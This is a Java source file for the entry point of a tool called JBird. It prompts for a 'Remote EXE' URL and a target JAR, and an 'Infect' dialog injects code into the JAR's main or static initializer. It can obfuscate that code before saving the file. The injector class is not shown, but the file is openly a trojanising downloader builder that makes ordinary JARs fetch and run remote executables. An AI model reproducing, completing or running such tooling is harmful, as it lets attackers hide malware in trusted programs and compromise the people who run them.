import util.misc.Settings;
import util.misc.UI;

import javax.swing.*;

public class Application {
    public static void main(String[] args) {
        System.out.println("Starting JBird v" + Settings.VERSION);
        System.out.println("Created by Contra. Visit RECoders.org");
        String url;
        String mname = "<clinit>";
        String file = null;
        boolean obfuscate = true;
        if (args.length == 0) {
            url = JOptionPane.showInputDialog("Remote EXE:", "http://example.com/test.exe");
            JFileChooser chooser = new JFileChooser();
            chooser.setFileFilter(UI.getGenericFilter("jar"));
            int returnVal = chooser.showDialog(null, "Infect");
            if (returnVal == JFileChooser.APPROVE_OPTION) {
                file = chooser.getSelectedFile().getAbsolutePath();
            } else {
                close("Please select a file next time.");
            }
            String[] appchoices = {"Standalone Program", "Script/Plugin/Other"};
            String appinput = UI.getComboInput(appchoices, "Program Type", "Please select the type of program");
            if (appinput == null) {
                close("Input Required!");
            } else if (appinput == appchoices[0]) {
                mname = "main";
            }
            String[] obchoices = {"Obfuscate", "Don't Obfuscate"};
            String obinput = UI.getComboInput(obchoices, "Obfuscation", "Would you like to obfuscate injected code?");
            if (obinput == null) {
                close("Input Required!");
            } else if (obinput == obchoices[1]) {
                obfuscate = false;
            }
        } else {
            file = args[0];
            url = args[1];
        }
        Injector inf = new Injector(file, url, mname);
        inf.load();
        inf.inject();
        if (obfuscate) {
            inf.obfuscate();
        }
        inf.save();
        close("Process Completed!");
    }

    public static void close(String msg) {
        System.out.println(msg);
        JOptionPane.showMessageDialog(null, msg);
        System.exit(1337);
    }
}
